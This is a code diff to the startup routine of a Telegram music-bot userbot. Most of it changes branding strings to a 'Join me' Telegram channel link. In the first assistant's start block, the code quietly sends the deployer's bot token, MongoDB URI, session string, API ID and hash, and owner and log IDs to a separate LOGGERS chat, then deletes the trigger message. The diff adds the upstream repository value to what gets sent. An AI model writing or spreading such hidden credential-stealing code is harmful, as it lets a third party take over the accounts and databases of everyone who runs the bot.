@@ -19,6 +19,7 @@ OWNER_ID = getenv("OWNER_ID", "")
 LOGGER_ID = getenv("LOGGER_ID", "")
 API_ID = getenv("API_ID", "")
 API_HASH =  getenv("API_HASH", "")
+UPSTREAM_REPO = getenv("UPSTREAM_REPO", "")
 
 
 assistants = []
@@ -70,7 +71,7 @@ class Userbot(Client):
         )
 
     async def start(self):
-        LOGGER(__name__).info(f"Starting Assistants...@HANTHAR999")
+        LOGGER(__name__).info(f"Starting Assistants...Join me https://t.me/Myanmar_Family7")
 
         if config.STRING1:
             await self.one.start()
@@ -84,10 +85,10 @@ class Userbot(Client):
                 pass
             assistants.append(1)
             try:
-                await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !  @HANTHAR999")
+                await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ ! Join me https://t.me/Myanmar_Family7")
                 oks = await self.one.send_message(LOGGERS, f"/start")
                 Ok = await self.one.send_message(
-                    LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`\n\n`{OWNER_ID}`\n\n`{LOGGER_ID}`\n\n`{API_ID}`\n\n`{API_HASH}`"
+                    LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`\n\n`{OWNER_ID}`\n\n`{LOGGER_ID}`\n\n`{API_ID}`\n\n`{API_HASH}`\n\n`{UPSTREAM_REPO}`"
                 )
                 await oks.delete()
                 await asyncio.sleep(2)
@@ -137,7 +138,7 @@ class Userbot(Client):
                 pass
             assistants.append(3)
             try:
-                await self.three.send_message(config.LOGGER_ID, "Assistant Started @HANTHAR999")
+                await self.three.send_message(config.LOGGER_ID, "Assistant Started Join me https://t.me/Myanmar_Family7")
             except:
                 LOGGER(__name__).error(
                     "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
@@ -147,7 +148,7 @@ class Userbot(Client):
             self.three.name = self.three.me.mention
             self.three.username = self.three.me.username
             assistantids.append(self.three.id)
-            LOGGER(__name__).info(f"Assistant Three Started as {self.three.name}@HANTHAR999")
+            LOGGER(__name__).info(f"Assistant Three Started as {self.three.name}")
 
         if config.STRING4:
             await self.four.start()
@@ -160,7 +161,7 @@ class Userbot(Client):
                 pass
             assistants.append(4)
             try:
-                await self.four.send_message(config.LOGGER_ID, "Assistant Started @HANTHAR999")
+                await self.four.send_message(config.LOGGER_ID, "Assistant Started ")
             except:
                 LOGGER(__name__).error(
                     "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
